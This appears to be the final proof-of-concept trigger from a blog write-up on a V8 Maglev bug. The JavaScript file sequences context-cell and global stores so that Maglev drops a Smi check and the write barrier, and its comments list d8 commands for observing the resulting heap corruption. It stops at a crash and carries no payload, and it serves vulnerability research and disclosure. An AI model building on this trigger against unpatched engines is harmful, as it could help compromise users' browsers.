// poc2.js — Step 3: the working trigger (elides CheckSmi AND the write barrier)
//
// Blog section: "The Trigger" (final PoC).
// Three throwaway stores plant the facts in order:
//   aT (kInt32 ContextCell) -> gives x a kInt32 alternative via CheckedNumberToInt32
//   bT (kConst ContextCell) -> gives x a constant alternative, no CheckedSmiUntag now
//   cT (kConstantType PropertyCell / global var) -> the vulnerable store
// At cT, Maglev believes x is a constant Smi, drops CheckSmi, and emits
// StoreTaggedFieldNoWriteBarrier on a real HeapNumber in Old Space.
//
// Observe the elision:
//   d8 --allow-natives-syntax --maglev --no-turbofan \
//      --print-maglev-graph poc2.js
//   (look for `StoreTaggedFieldNoWriteBarrier` with no CheckSmi / CheckedSmiUntag)
//
// Observe the memory-safety failure (may need GC pressure / repetition):
//   d8 --allow-natives-syntax --maglev --no-turbofan --expose-gc poc2.js
//
// Expected on a dcheck/verify-heap build: a write-barrier / heap-verification
// CHECK failure (a `#FailureMessage Object: ...`), i.e. a HeapObject stored
// into Old Space without the barrier that the GC relies on.

const f64src = new Float64Array(1);
f64src[0] = 11.0; // Construct a HeapNumber

let aT = 1; // Get aT to be kConst to start with
aT = 0x40000000; // Turn aT into kInt32 since this value is outside 31-bit Smi range

// bT is a kConst, because its initial value is the same as
// what we use in the warm-up
let bT = 11;

// cT is a global property
// cT changes value but stays as a Smi, so it is kConstantType
// Needed to take BuildCheckSmi path
var cT = 1; cT = 10; 

function ct_only(x) {
  aT = x;
  bT = x;
  cT = x;
}

%PrepareFunctionForOptimization(ct_only);
ct_only(11);
ct_only(11);
%OptimizeMaglevOnNextCall(ct_only);
ct_only(f64src[0]);
